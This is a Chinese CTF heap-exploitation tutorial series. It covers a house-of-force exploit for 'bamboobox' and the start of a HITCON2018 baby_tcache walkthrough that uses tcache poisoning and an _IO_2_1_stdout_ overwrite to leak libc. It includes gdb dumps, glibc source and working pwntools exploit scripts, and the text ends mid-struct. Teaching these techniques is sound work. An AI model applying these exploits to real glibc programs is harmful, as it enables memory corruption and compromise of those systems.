<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x25ed000</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x0000000a61616464	0x0000000000000000</span><br><span class="line">0x25ed040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed060:	0x0000000000000000	0x0000000000020fa1</span><br><span class="line">0x25ed070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>通过edit 覆盖到top chunk的size部分</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x25ed030-0x30</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed060:	0x6161616161616161	0xffffffffffffffff</span><br><span class="line">0x25ed070:	0x000000000000000a	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>此时top chunk位置0x00000000025ed060</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (malloc_state *) 0x7f2a72614b20 &lt;main_arena&gt;</span><br><span class="line">gdb-peda$ x/20gx 0x7f2a72614b20</span><br><span class="line">0x7f2a72614b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00000000025ed060</span><br></pre></td></tr></table></figure>

<p>位置为0x25ed060处，我们要覆盖的是0x25ed010处指针，故偏移为0x25ed060-0x25ed010-0x10 = 0x60</p>
<p>不过是负的，我们要往上偏移，所以要malloc(-)的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T)(<span class="number">-2</span> * MINSIZE))</span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) = request2size(req);</span><br></pre></td></tr></table></figure>

<p>这里先要过掉第一个检查， -2*MINSIZE，可以pass,接下来要让我们的<br>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 刚好等于=-60<br>所以要减掉个SIZE_SZ, -68就是malloc大小了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (malloc_state *) 0x7f2a72614b20 &lt;main_arena&gt;</span><br><span class="line">gdb-peda$ x/20gx 0x7f2a72614b20</span><br><span class="line">0x7f2a72614b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00000000025ed000</span><br><span class="line">0x7f2a72614b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00007f2a72614b78</span><br><span class="line">0x7f2a72614b90 &lt;main_arena+112&gt;:	0x00007f2a72614b78	0x00007f2a72614b88</span><br><span class="line">0x7f2a72614ba0 &lt;main_arena+128&gt;:	0x00007f2a72614b88	0x00007f2a72614b98</span><br><span class="line">0x7f2a72614bb0 &lt;main_arena+144&gt;:	0x00007f2a72614b98	0x00007f2a72614ba8</span><br><span class="line">gdb-peda$ x/10gx 0x00000000025ed000</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000059</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed040:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></figure>

<p>你看成功转移到这里了，现在在malloc一次就可以了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x1483000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x21, </span><br><span class="line">  fd = 0x400d49 &lt;magic&gt;, </span><br><span class="line">  bk = 0x400d49 &lt;magic&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x39</span><br><span class="line">&#125;</span><br><span class="line">0x1483020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x39, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x6161616161616161, </span><br><span class="line">  fd_nextsize = 0x6161616161616161, </span><br><span class="line">  bk_nextsize = 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x1483058 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x6161616161616161, </span><br><span class="line">  size = 0x6161616161616161, </span><br><span class="line">  fd = 0xffffffffffffa1, </span><br><span class="line">  bk = 0xa, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功覆盖，最后退出一下就好了</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>这里直接用的ctf-wiki的exp,我只改动了一处，他还减多个0xf,没看懂，所以删掉了，也没事</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line"><span class="comment"># we must alloc enough size, so as to successfully alloc from fake topchunk</span></span><br><span class="line">additem(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)  <span class="comment"># idx 0</span></span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span>  <span class="comment"># idx 0's content</span></span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0xffffffffffffffff</span>)  <span class="comment"># top chunk's prev_size and size</span></span><br><span class="line"><span class="comment"># modify topchunk's size to -1</span></span><br><span class="line">modify(<span class="number">0</span>, <span class="number">0x41</span>, payload)</span><br><span class="line"><span class="comment"># top chunk's offset to heap base</span></span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc_size = offset_to_heap_base - <span class="number">0x8</span> </span><br><span class="line">additem(malloc_size, <span class="string">"dada"</span>)</span><br><span class="line">additem(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一次性学了house of einherjar和house of force,ctf-wiki还是强，不过有些得自己调试才好,适合自己的才是最好的</p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程8</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程8"><a href="#pwn堆入门系列教程8" class="headerlink" title="pwn堆入门系列教程8"></a>pwn堆入门系列教程8</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a><br><a href="https://xz.aliyun.com/t/6377" target="_blank" rel="noopener">pwn堆入门系列教程5</a><br><a href="https://xz.aliyun.com/t/6406" target="_blank" rel="noopener">pwn堆入门系列教程6</a><br><a href="https://xz.aliyun.com/t/6449" target="_blank" rel="noopener">pwn堆入门系列教程7</a></p><p>这篇文章感觉算堆又不算堆，因为要结合到IO_FILE攻击部分，而且最主要是IO_FILE的利用，此题又学习到新的东西了，以前只玩过IO_FILE的伪造vtable,这次的leak方法第一次见</p><a id="more"></a>

<h2 id="HITCON2018-baby-tcache"><a href="#HITCON2018-baby-tcache" class="headerlink" title="HITCON2018 baby_tcache"></a>HITCON2018 baby_tcache</h2><p>这道题我故意将其与tcache中的第一道题分开，因为这道题难度不在于tcache的攻击，而在于IO_FILE的利用，利用上一篇文章中的方法也很容易构造overlap，但libc却无法泄露，我自己纠结好久过后，还是看了wp</p>
<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>新建一个堆块，存在off-by-one</li>
<li>删除一个堆块</li>
<li>退出</li>
</ol>
<p>无leak函数</p>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_C6B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">":("</span>);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !qword_202060[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = sub_B27();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">  sub_B88((__int64)v3, size);</span><br><span class="line">  v3[size] = <span class="number">0</span>;</span><br><span class="line">  qword_202060[i] = v3;</span><br><span class="line">  v0 = qword_2020C0;</span><br><span class="line">  qword_2020C0[i] = size;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点很明显，off-by-one，在堆块重用机制下，会覆盖到下一个堆快的size部分</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>起初自己分析的时候做着做着忘了他没有leak，一股脑构造了个overlap，然后？？？我没有leak咋泄露啊，然后爆炸了，卡了很久都不知道怎么leak<br>看了别人的wp后发觉是利用IO_FILE泄露，以前没有接触过，所以这次记录下</p>
<h4 id="堆操作初始化"><a href="#堆操作初始化" class="headerlink" title="堆操作初始化"></a>堆操作初始化</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>这个没啥好讲的，每次都得写</p>
<h4 id="这部分是构造overlap的"><a href="#这部分是构造overlap的" class="headerlink" title="这部分是构造overlap的"></a>这部分是构造overlap的</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>前面学过chunk extend部分，这部分应该很好理解，至于那里为什么是\x60\x06</p>
<blockquote>
<blockquote>
<blockquote>
<p>hex(0x500+0x30+0x40+0x50+0x60+0x40)<br>‘0x660’</p>
</blockquote>
</blockquote>
</blockquote>
<p>注意0x500这部分包括chunk的pre_size和size部分</p>
<p>计算的时候要算上chunk头部大小</p>
<h4 id="leak-libc-重点"><a href="#leak-libc-重点" class="headerlink" title="leak libc(重点)"></a>leak libc(重点)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x530</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">print(repr(info1))</span><br><span class="line">leak_libc = u64(info1)</span><br><span class="line">io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br></pre></td></tr></table></figure>

<ol>
<li>我们要将unsortbin移动到chunk2部分，所以总大小为0x500+0x30+0x10=0x540，所以malloc是0x530</li>
<li>delete(4)为了后面做准备</li>
<li>接下来要覆盖的后三位是0x760，这是不会改的，内存一个页是0x1000，后三位是固定的，所以需要爆破高位，我们爆破猜测为0，所以是0x0760，这里是chunk2的数据部分，本来是main_arena的数据的，现在修改他的低两个字节,需要改成<em>IO_2_1_stdout</em></li>
<li>tcache poisoning攻击</li>
<li>这里的为什么是fbad1800?以及0x3e大小，还有p64(0)如何来的？</li>
</ol>
<p>引用ctf-wiki</p>
<p>最终会调用到这部分代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)  </span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">      :</span><br><span class="line">      :</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                                <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                                <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>

<p>下面会以_IO_do_write相同的参数调用new_do_write</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)  <span class="comment">/* 需要满足 */</span></span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">     ............</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">// 这里真正进行 write</span></span><br></pre></td></tr></table></figure>

<p>我们目的是调用到_IO_SYSWRITE，所以要bypass前面的检查，结合起来</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>

<p>上面这部分ctf-wiki讲过了不在重复叙述，我当初纠结的是puts究竟是如何泄露libc的，<br>我们要用的是_IO_SYSWRITE(fp, data, to_do)<br>这个函数最终对应到函数 write(fp-&gt;fileno, data, to_do)<br>程序执行到这里就会输出 f-&gt;_IO_write_base中的数据，而这些数据里面，就会存在固定的libc中的地址。</p>
<p>这部分过程建议读读这篇文章，当输出缓冲区还没有满时，会将即将打印的字符串复制到输出缓冲区中，填满输出缓冲区。然后调用_IO_new_file_overflow刷新输出缓冲区</p>
<p><a href="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/" target="_blank" rel="noopener">IO-FILE部分源码分析及利用</a></p>
<p>所以会泄露出部分数据，逆着推导我们需要执行到这个函数，就需要bypass前面的检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                              <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                              <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">           f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>

<p>这里我们将_IO_write_base最低覆盖成0了，所以他大部分情况下比_IO_write_ptr小，所以to_do的大小就变成相对可控了</p>
<p>在逆向回去就是flag检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"></span><br><span class="line">_flags = <span class="number">0xfbad0000</span>	<span class="comment">//高两个字节是magic不用管</span></span><br><span class="line">_flags &amp; = _IO_NO_WRITES = <span class="number">0</span></span><br><span class="line">_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">所以_flag的值为<span class="number">0x0</span>xfbad18*<span class="number">0</span>  *可以为任何数</span><br></pre></td></tr></table></figure>

<p>其实魔数部分改成什么都可以</p>
<p>原理讲通后就是测试了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 